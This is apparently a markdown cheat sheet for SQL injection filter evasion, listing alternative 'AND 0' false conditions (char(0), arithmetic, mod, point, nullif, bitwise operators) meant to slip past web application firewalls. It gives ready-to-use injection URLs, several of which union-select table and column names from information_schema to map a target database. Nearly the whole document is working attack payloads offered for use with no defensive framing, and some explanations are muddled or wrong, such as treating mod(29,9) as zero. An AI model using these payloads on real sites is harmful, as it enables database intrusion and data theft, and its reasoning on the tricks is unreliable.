# The Alternative WAY of using And 0 in SQL Injection

## The traditional way of using **And 0**  

- And 1=0
- And false
- And 0
- And 50=60 
- Any number that are not the same will equal to (0,false,null)


## The alternative way of using **And 0** for WAF Bypass purpose

### Using char() for 0, null, false values

- And char(0)
- And char(false)
- And char(null)
```
http://website.com/index.php?id=1 and char(0) Union Select '1 and char(0) union select 1,2,group_concat(0x3c6c693e,table_name,0x203a3a20,column_name),4,5,6 from information_schema.columns where table_schema=database()',2,3,4,5,6--+-
```

### Any Mathematical/Arithmetic or Logical Problem's that equal to 0

- And 1*0
- And 1-1
- And 0/1
```
http://website.com/index.php?id=1 and 1*0 order by 1--
```

### Using mod()

- And mod(29,9)
```
http://website.com/index.php?id=1 and mod(29,9) Order by 10--
```

### Using point()

- And point(29,9)
```
http://website.com/index.php?id=1 and point(29,9) Order by 10--
```

### Using **nullif(1336,1337)**
If one arguments is different nullif(1336,1337) it return the first argument and it will consider as true.So no need to use this.But sometimes it works. Since both arguments are equal it return as null value or it's considered as false,0,null and it will valid as Bypass Method in SQL.

- And nullif(1337,1337)
```
http://website.com/index.php?id=1 and nullif(1337,1337) Union Select '1 and nullif(1337,1337) union select 1,2,group_concat(0x3c6c693e,table_name,0x203a3a20,column_name),4,5,6 from information_schema.columns where table_schema=database()',2,3,4,5,6--+-
```

## Illegal parameter data types

### For operation **MOD**

- % = Modulo 
```
http://website.com/index.php?id=1 % point(29,9) Order by 10--
```

### For operation **&**

- & = Bitwise And 
- && = Logical And
```
http://website.com/index.php?id=1 && point(29,9) Order by 10--
```

### For operation **OR**

- | = Bitwise OR
- || = Logical OR, sometimes use for Concatanation
```
http://website.com/index.php?id=1 ||point(29,9) Order by 11--
```
